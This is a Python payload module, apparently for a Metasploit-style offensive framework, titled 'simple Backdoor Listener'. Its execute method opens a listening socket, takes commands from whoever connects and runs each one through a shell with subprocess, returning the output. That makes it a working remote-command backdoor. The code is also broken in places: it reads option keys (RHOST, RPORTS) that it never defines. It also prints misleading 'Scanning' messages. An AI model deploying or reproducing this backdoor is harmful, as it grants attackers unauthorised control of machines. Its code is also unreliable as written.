# MODULE_TYPE specifies the category (exploit, payload, auxiliary, encoder, cracker, postexploit, evade, nop, recon)
MODULE_TYPE = "payload"
import time,socket,subprocess
from collections import OrderedDict
# Module class definition
class ModuleClass:
    def __init__(self):
        #self.scan = connScan(target,int(port))
        self.info = {
            'Name': 'simple Backdoor Listener',
            'Rank':'Fair',
            'Platform':'Windows/Linux',
            'Description': 'Spawns a remote reverse shell on target',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Options': OrderedDict([
                ('TARGET', ('', True, 'Target IP')),
                ('PORTS',('', True, 'Target Port'))
               
            ])
        }

    def help(self):
        print("Usage: set TARGET <IP> | set PORTS <PORT> <type> then run")
    	
    
    def execute(self):
        target = self.info['Options']['RHOST'][0]
        port = self.info['Options']['RPORTS'][0]
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        	host = target
        	addr = host, int(port)
        	sock.bind(addr)
        	print ("[✓] " + str(addr) + " binded successfully ...")
        	sock.listen(4)
        	print ("[+] listening on " + str(addr))
        	conn, addr = sock.accept()
        	while True:
        		print ("[✓] connection accepted ...")
        		data = conn.recv(2048).decode()
        		print ("[🔥] received >>\n" ,data)
        		output = subprocess.check_output(data, shell=True, universal_newlines=True)
        		conn.sendall(str.encode(output))
        		time.sleep(0.2)
        		print(f"[+] Scanning {target}:{port}  ...")
        		time.sleep(0.2)
        		print("[+] please wait a sec...")
        		time.sleep(0.2)
        
        return "[OK] Waiting for Client to conmect..."
    